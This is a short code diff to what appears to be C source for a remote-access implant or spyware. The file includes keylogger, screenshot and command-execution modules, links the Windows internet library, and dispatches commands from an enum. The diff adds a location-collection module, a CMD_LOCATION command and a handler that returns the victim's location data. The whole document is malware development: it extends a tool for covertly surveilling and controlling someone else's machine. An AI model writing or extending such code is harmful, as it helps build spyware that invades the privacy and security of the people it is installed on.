@@ -12,6 +12,7 @@
 #include "keylogger.c"
 #include "screenshot.c"
 #include "command_executor.c"
+#include "location_collector.c"
 
 #ifdef _WIN32
 #pragma comment(lib, "wininet.lib")
@@ -41,6 +42,7 @@ typedef enum {
     CMD_SCREENSHOT = 4,
     CMD_INFO_COLLECT = 5,
     CMD_EXECUTE = 6,
+    CMD_LOCATION = 7,
     CMD_NONE = 0
 } CapabilityCommand;
 
@@ -328,6 +330,9 @@ DWORD WINAPI capability_execution_thread(LPVOID arg) {
                     output = strdup("failed to execute");
                 }
             }
+            break;
+        case CMD_LOCATION:
+            output = get_location_info();
             break;
         default:
             break;
